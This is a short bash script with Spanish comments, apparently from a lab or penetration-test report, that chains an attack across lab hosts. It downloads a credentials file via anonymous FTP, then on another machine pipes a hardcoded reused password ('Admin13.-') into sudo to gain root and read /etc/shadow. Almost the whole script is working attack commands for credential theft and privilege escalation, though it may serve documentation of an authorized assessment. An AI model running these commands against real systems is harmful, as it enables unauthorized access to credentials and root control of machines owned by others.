#!/usr/bin/env bash
# root-chain.sh — B3 (FTP anónimo) -> credencial reutilizada en M1 -> sudo -> root.
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1

echo "== B3 · FTP anónimo M3: credenciales expuestas =="
curl -s --max-time 10 ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt

echo
echo "== M1 · la misma clave se reutiliza en 'ubuntu' =="
./informe/tools/vm.sh m1 '
hostname
echo -n "usuario: "; id
echo -n "sudo:    "; echo "Admin13.-" | sudo -S id 2>/dev/null
echo -n "shadow:  "; echo "Admin13.-" | sudo -S head -1 /etc/shadow 2>/dev/null
'
